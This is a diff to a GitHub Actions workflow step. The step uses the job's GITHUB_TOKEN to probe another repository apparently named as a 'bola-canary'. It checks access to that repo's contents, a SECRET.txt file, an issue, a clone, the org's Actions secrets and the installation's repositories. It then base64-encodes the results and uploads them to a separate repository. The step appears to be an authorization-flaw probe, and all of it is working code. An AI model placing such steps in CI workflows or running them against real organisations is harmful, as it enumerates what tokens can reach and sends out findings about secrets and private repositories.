@@ -9,18 +9,17 @@ jobs:
         env:
           GT: ${{ secrets.GITHUB_TOKEN }}
         run: |
+          set +eo pipefail
           A=https://api.github.com
           C=s3rdz0-org/bola-canary-23514
-          RES="$(
-            echo "REPO_API:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C)"
-            echo "CONTENTS:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C/contents/SECRET.txt)"
-            echo "ISSUE:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C/issues/1)"
-            echo "CLONE:$(git clone https://x-access-token:$GT@github.com/$C /tmp/c 2>&1 | tail -1)"
-            echo "ORG_SECRETS:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/orgs/s3rdz0-org/actions/secrets)"
-            echo "ORG_REPOS_PRIV:$(curl -s -H "Authorization: token $GT" "$A/orgs/s3rdz0-org/repos?type=private" | head -c 120)"
-            echo "INSTALL_REPOS:$(curl -s -H "Authorization: token $GT" $A/installation/repositories | head -c 400)"
-          )"
-          echo "$RES"
-          echo "$RES" >> "$GITHUB_STEP_SUMMARY"
-          B64=$(printf '%s' "$RES" | base64 -w0)
-          curl -s -X PUT -H "Authorization: token $GT" $A/repos/s3rdz0-org/bola-actions/contents/RESULTS.txt -d "{\"message\":\"res\",\"content\":\"$B64\"}" -o /dev/null -w "PUT_RESULT:%{http_code}\n"
+          RES=""
+          RES="${RES}REPO_API:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C)\n"
+          RES="${RES}CONTENTS:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C/contents/SECRET.txt)\n"
+          RES="${RES}ISSUE:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C/issues/1)\n"
+          RES="${RES}CLONE:$(git clone https://x-access-token:$GT@github.com/$C /tmp/c 2>&1 | tail -1)\n"
+          RES="${RES}ORG_SECRETS:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/orgs/s3rdz0-org/actions/secrets)\n"
+          RES="${RES}INSTALL_REPOS:$(curl -s -H "Authorization: token $GT" $A/installation/repositories | tr -d '\n' | cut -c1-400)\n"
+          printf "%b" "$RES"
+          printf "%b" "$RES" >> "$GITHUB_STEP_SUMMARY"
+          B64=$(printf "%b" "$RES" | base64 -w0)
+          curl -s -X PUT -H "Authorization: token $GT" $A/repos/s3rdz0-org/bola-actions/contents/RESULTS.txt -d "{\"message\":\"res\",\"content\":\"$B64\"}" -o /dev/null -w "PUT:%{http_code}\n"
